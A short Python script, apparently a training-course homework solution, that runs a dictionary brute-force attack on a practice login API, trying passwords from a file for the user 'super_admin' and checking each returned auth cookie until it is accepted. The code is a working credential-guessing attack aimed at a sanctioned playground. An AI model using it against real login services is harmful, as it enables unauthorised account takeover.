import requests
import re
import json
import time
import sys

file = open("pass.txt", "r").readlines()
list_pass = []
for i in file:
    list_pass.append(i.strip())
#print(list_pass)
print("Ожидайте, идет перебор пароля...")

for j in list_pass:
    payload = {"login":"super_admin", "password":j}
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
    #print(dict(response.cookies))
    cookie_value = response.cookies.get('auth_cookie')

    cookies = {"auth_cookie":cookie_value}
    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    text_answ = response2.text
    #print(cookie_value,j, "\n",text_answ)
    if text_answ == "You are authorized":
        print("Поздравляю! Пароль:",j,"\n", text_answ)
